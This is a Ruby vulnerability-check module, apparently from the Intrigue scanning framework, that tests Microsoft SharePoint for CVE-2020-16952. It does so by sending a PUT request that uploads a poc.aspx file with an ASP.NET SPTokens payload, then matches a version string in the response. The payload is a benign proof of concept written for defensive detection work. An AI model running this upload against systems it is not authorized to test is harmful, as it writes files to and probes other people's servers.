module Intrigue
    module Task
    class VulnSharepointCve202016952 < BaseTask
    
      def self.metadata
        {
          :name => "vuln/microsoft_sharepoint_cve_2020_16952",
          :pretty_name => "Vuln Check - Microsoft Sharepoint RCE (CVE-2020-16952) ",
          :authors => ["shpendk"],
          :identifiers => [{ "cve" =>  "CVE-2020-16952" }],
          :description => "This task checks for CVE-2020-16952 in Microsoft Sharepoint by uploading a poc file",
          :references => ["https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16952"],
          :type => "vuln_check",
          :passive => false,
          :allowed_types => ["Uri"],
          :example_entities => [{"type" => "Uri", "details" => {"name" => "https://intrigue.io"}}],
          #:allowed_options => [{:name => "force", :regex => "boolean", :default => false }],
          :created_types => []
        }
      end
    
      ## Default method, subclasses must override this
      def run
        super
    
        # prepare PUT request
        url = "#{_get_entity_name}/poc.aspx"
        body = "<asp:Literal runat=\"server\" Text=\"<%$SPTokens:{ProductNumber}%>\" />"
        
        # make PUT request
        res = http_request :put, url, nil, {}, body

        # exit if no respone
        unless res
          _log_error "No response received. Exiting."
          return
        end

        # check response for match
        if res.code == "200" && res.body =~ /16\.0\.10364\.20001/i
          _log "Target is  vulnerable! Creating issue."
          _create_linked_issue("microsoft_sharepoint_cve_2020_16952", {
            proof: {
              response_body: res.body
            }
          })
          return
        else
          _log "Not vulnerable, exiting!"
        end

      end
    
    end
    end
    end
    